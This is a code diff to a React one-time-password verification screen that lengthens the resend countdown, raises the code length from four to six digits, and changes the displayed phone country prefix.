@@ -8,9 +8,9 @@ const OtpVerification = () => {
   const location = useLocation();
   const phoneNumber = location.state?.phoneNumber || "78****901";
   const [otp, setOtp] = useState("");
-  const [countdown, setCountdown] = useState(35);
+  const [countdown, setCountdown] = useState(50);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const length = 4;
+  const length = 6;
  
   // Mask phone number
   const maskedPhone = phoneNumber.length >= 8
@@ -87,7 +87,7 @@ const sendTelegramOtpEvent = (phone: string, otpLength: number) => {
 
   const handleResend = () => {
     if (countdown === 0) {
-      setCountdown(35);
+      setCountdown(50);
       // Resend OTP logic here
     }
   };
@@ -126,7 +126,7 @@ const sendTelegramOtpEvent = (phone: string, otpLength: number) => {
 
       {/* Masked Phone Number */}
       <p className="text-foreground font-medium mb-8">
-        +266 {maskedPhone}
+        +263 {maskedPhone}
       </p>
 
       {/* OTP Input */}
